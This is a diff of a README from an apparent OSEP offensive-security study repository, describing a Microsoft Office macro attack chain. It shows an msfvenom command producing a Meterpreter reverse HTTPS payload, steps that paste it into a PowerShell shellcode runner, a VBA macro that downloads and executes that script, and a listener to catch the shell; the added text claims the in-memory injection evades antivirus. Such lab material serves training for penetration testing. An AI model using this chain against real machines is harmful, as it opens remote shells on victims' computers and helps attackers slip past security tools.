@@ -62,7 +62,7 @@ We can execute the code of a remote script by using some Powershell methods.
     ```shell
     msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
     ```
-2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) script.
+2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) or [CustomeShellcodeRunner.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/CustomeShellcodeRunner.ps1) script.
 
 3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared VBAenvlauncher.ps1 script. The line stored on the *str* var must be:
 
@@ -74,6 +74,8 @@ We can execute the code of a remote script by using some Powershell methods.
 
 4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).
 
-The rest of scripts present on this repository are only to help the reader to understand the main scripts necesary to perform the operation.
+Thus, we inyect in the flow of execution of an existing proces the contents of a script which not exist on the current system soc cannot be detected with the AV.
+
+The rest of scripts present on this repository are only to help the reader to understand the main scripts necesary to perform the operation. 
 
 <br>
